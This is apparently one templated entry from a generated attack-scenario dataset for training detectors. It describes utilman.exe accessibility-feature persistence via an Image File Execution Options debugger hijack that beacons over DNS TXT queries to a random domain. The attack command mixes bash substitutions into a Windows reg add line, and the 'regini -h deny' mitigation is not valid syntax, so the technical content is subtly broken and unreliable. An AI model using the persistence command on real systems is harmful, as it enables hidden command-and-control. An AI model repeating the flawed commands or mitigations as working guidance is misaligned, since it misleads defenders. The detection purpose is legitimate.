---
type: campaign
scenario_id: 448
tactic: Persistence
technique: "T1546.008: Accessibility Features"
technique_id: T1546.008
tags: [campaign, lotl, persistence]
---

# Using utilman for DNS tunneling persistence.

## Threat Description
Using utilman for DNS tunneling persistence.

## Attack Command
```
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe /v Debugger /t REG_SZ /d "nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)" /f
```

## Detection Logic
Monitor utilman registry: `reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe | findstr nslookup`; Event ID 4657.

## Mitigation
Restrict utilman writes: `regini -h deny HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.

## AI Training Prompt
Train AI to detect utilman-based DNS tunneling persistence by analyzing registry changes, nslookup TXT queries, and DNS traffic patterns; suggest registry protections.

## References
- MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
